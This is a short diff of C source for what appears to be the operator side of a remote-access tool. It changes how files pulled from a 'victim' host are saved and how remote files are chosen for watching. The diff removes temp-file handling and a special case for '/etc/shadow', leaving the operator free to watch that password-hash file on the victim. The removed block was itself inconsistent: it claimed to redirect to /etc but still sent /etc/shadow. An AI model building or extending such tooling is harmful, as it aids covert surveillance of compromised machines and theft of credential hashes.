@@ -537,7 +537,7 @@ static int session_receive_file_response(session_t *session, const char *local_p
     FILE *fp;
     int write_failed = 0;
 
-    snprintf(temp_path, sizeof(temp_path), "%s.part", local_path);
+    snprintf(temp_path, sizeof(temp_path), "%s", local_path);
     fp = fopen(temp_path, "wb");
     if (fp == NULL) {
         fprintf(stderr, "Unable to open %s for writing: %s\n", temp_path, strerror(errno));
@@ -576,12 +576,6 @@ static int session_receive_file_response(session_t *session, const char *local_p
 
         print_status_response(&parsed);
         if (parsed.command == CMD_ERROR) {
-            remove(temp_path);
-            return -1;
-        }
-
-        if (rename(temp_path, local_path) != 0) {
-            fprintf(stderr, "Failed to rename %s to %s: %s\n", temp_path, local_path, strerror(errno));
             remove(temp_path);
             return -1;
         }
@@ -966,11 +960,6 @@ static int watch_file_on_victim(session_t *session) {
 
     if (read_path_with_default("Remote file path to watch", NULL, remote_path, sizeof(remote_path)) != 0) {
         return -1;
-    }
-
-    if (strcmp(remote_path, "/etc/shadow") == 0 || strcmp(remote_path, "shadow") == 0) {
-        printf("Watching /etc directory instead of /etc/shadow (per requirements)\n");
-        return session_send_command(session, CMD_WATCH_FILE, (const uint8_t *)"/etc/shadow", (uint16_t)(strlen("/etc/shadow") + 1));
     }
 
     return session_send_command(session, CMD_WATCH_FILE, (const uint8_t *)remote_path, (uint16_t)(strlen(remote_path) + 1));
